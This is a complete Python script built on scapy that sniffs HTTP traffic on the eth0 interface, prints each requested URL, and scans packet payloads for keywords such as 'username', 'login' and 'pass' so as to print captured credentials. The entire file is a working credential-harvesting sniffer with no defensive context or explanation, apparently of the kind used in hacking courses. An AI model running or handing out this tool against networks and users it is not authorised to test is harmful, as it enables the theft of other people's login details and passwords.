#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode("utf-8")
    path = packet[http.HTTPRequest].Path.decode("utf-8")
    return host + path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode("utf-8")
        keywords = ["username", "user", "login", "email", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")

        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible username/password > {login_info}\n\n")


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


sniff("eth0")
